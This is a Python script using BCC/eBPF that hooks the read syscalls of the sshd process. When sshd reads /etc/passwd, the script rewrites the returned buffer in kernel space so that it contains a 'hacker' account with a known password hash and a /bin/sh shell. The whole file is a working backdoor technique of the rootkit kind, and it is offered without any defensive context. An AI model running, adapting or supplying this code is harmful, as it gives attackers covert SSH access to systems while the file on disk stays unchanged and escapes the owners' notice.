from bcc import BPF

bpf_text="""
#include <linux/fdtable.h>

BPF_HASH(pid_buf, u64, u64, 10240);


// reference  /sys/kernel/debug/tracing/events/syscalls/sys_enter_read/format
struct sys_exit_read{
    long long __un_use;
    long long  __un_use2;
    long long fd ;
    unsigned long long buf;
    long long count;
};

static int memcmp1(char* a, char * b,int size){
     for(int i=0;i<size;i++){
        if (a[i]!=b[i]){
            return -1;
        }
     }
    return 0;
}

static void f_name_from_fd(int fd, char* filename,int size){
   struct task_struct* t;
    struct files_struct* f;
    struct fdtable* fdt;
    struct file** fdd;
    struct file* file;
    struct path *path;
    struct dentry *dentry;
    struct qstr d_name;

    t = (struct task_struct*)bpf_get_current_task();
    f = t->files;

    bpf_probe_read(&fdt, sizeof(fdt), &f->fdt);
    bpf_probe_read(&fdd, sizeof(fdd), &fdt->fd);
    bpf_probe_read(&file, sizeof(file), &fdd[fd]);
    path = &file->f_path;
    bpf_probe_read(&dentry, sizeof(dentry), &path->dentry);
    bpf_probe_read(&d_name, sizeof(d_name), &dentry->d_name);
    bpf_probe_read_str(filename, size, d_name.name);
}

static int check_command(char* command,int size){
    char comm[16] ;
    bpf_get_current_comm(comm,16);
    if (memcmp1(comm,command,size)!=0){
        return 0;
    }
    return 1;
}

int read_enter_hook(void* _arg) {
    char comm[] = "sshd" ;
    if (!check_command(comm,sizeof(comm))){
        return 0;
    }
    
    long pid = bpf_get_current_pid_tgid();
    struct sys_exit_read * arg = (struct sys_exit_read *)_arg;
    char filename[64];
    f_name_from_fd(arg->fd,filename,sizeof(filename));
    if (memcmp1(filename,"passwd",6)!=0){
        return 0;
    }
    bpf_trace_printk("====== read enter =======");
    unsigned long long buf = (unsigned long long)arg->buf;
    bpf_trace_printk("pid %d, prog %s read %s",pid,comm,filename);
    bpf_trace_printk("buf addr: %d",buf);
    bpf_trace_printk("buf char: %s",(char*)buf);
    pid_buf.update(&pid,&buf);
    bpf_trace_printk("======= read enter end =======");
    return 0;
}

int read_exit_hook(void* _arg){
    char comm[] = "sshd" ;
    if (!check_command(comm,sizeof(comm))){
        return 0;
    }

    long pid = bpf_get_current_pid_tgid();
    unsigned long long *buf = pid_buf.lookup(&pid);
    if (buf==NULL){
        return 0;
    }
    pid_buf.delete(&pid);
    bpf_trace_printk("b pid %d, buf addr %d",pid,*buf);
    char read_str[64];
    long ret = bpf_probe_read_user_str(read_str,sizeof(read_str),(char*)*buf);

    bpf_trace_printk("pid %d, buf char %s",pid,read_str);
    bpf_trace_printk("read len %d",ret);
    
    // 一般 /etc/passwd 都是一样的开头
    char passwd_first[] = "root:x:0:0:root:/root";
    // 检测是否匹配/etc/passwd
    if (memcmp1(read_str,passwd_first,sizeof(passwd_first)-1)==0){
        bpf_trace_printk("rewrite passwd");
        char *buf_addr = (char *)*buf;
        // 重写返回buff
        // with passwd 'asd'
        char replace_etc_pwd[] = "hacker:oE7ErmEGwyKBE:1:0::/tmp:/bin/sh";
        bpf_probe_write_user(buf_addr,replace_etc_pwd,sizeof(replace_etc_pwd));
    }
    
}

"""

b = BPF(text=bpf_text)
b.attach_tracepoint("syscalls:sys_enter_read",fn_name="read_enter_hook")
b.attach_tracepoint("syscalls:sys_exit_read",fn_name="read_exit_hook")
while 1:
    (task, pid, cpu, flags, timestamp, msg)  = b.trace_fields()
    print(msg)